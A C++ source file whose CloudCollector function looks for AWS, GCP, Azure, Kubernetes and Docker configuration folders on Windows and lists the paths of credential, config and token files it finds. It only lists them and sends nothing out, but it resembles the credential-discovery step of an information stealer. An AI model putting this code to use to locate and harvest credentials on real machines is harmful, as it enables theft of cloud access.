#include "cloud_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string CloudCollector::CollectCloudConfigs() {
    std::ostringstream result;
    result << "\n=== CLOUD CONFIGS ===\n";
    
    char userprofile[MAX_PATH], appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, userprofile);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::vector<std::pair<std::string, std::string>> cloudPaths = {
        {"AWS", std::string(userprofile) + "\\.aws"},
        {"GCP", std::string(appdata) + "\\gcloud"},
        {"Azure", std::string(userprofile) + "\\.azure"},
        {"Kubernetes", std::string(userprofile) + "\\.kube"},
        {"Docker", std::string(userprofile) + "\\.docker"}
    };
    
    int found = 0;
    for (const auto& [name, path] : cloudPaths) {
        if (std::filesystem::exists(path)) {
            result << name << ": FOUND\n";
            found++;
            
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(path)) {
                    if (p.is_regular_file()) {
                        std::string filename = p.path().filename().string();
                        if (filename == "config" || filename == "credentials" || 
                            filename.find("config") != std::string::npos ||
                            filename.find("token") != std::string::npos) {
                            result << "  Config: " << p.path().string() << "\n";
                        }
                    }
                }
            } catch (...) {
                result << "  Access denied\n";
            }
        }
    }
    
    result << "Total cloud services found: " << found << "\n";
    
    return result.str();
}
